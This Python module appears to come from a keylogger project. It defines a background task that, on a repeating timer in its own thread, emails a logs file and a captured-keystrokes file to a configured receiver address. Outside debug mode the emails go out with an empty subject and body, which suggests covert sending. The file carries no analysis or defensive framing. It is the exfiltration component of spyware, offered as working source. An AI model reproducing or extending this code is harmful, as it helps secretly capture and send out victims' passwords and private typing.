from .email_sender import SendEmail
from .config import DEBUG,LOG_INTERVAL,LOGS_FILE,LOGS_DIR,KEYSTROKES_FILE,RECEIVER_EMAIL,SENDER_EMAIL
from .utils import repeatedFunction
import os
import threading
if DEBUG:
    from keylogger import psw


class BackgroundTask:
    def __init__(self):
        self.EMAIL_SUBJECT = ""
        self.EMAIL_BODY = ""
    
    def send_logs(self):
        if DEBUG:
            program = SendEmail()
            program.send_email(os.path.join(LOGS_DIR,LOGS_FILE),os.path.join(LOGS_DIR,KEYSTROKES_FILE),sender_email=psw.email,receiver_email=psw.email,subject="LOGS",body="LOG FILES")
        else:
            program = SendEmail()
            program.send_email(os.path.join(LOGS_DIR,LOGS_FILE),os.path.join(LOGS_DIR,KEYSTROKES_FILE),sender_email=SENDER_EMAIL,receiver_email=RECEIVER_EMAIL,subject=self.EMAIL_SUBJECT,body=self.EMAIL_BODY)


    def start(self):
        '''
        This function starts all the background task in a thread,so dont start them in a thread again.
        '''
        
        sendLogs_thread = threading.Thread(target=repeatedFunction,args=(self.send_logs,LOG_INTERVAL))
        sendLogs_thread.start()


if __name__ == "__main__" and DEBUG:
    app = BackgroundTask()
    app.start()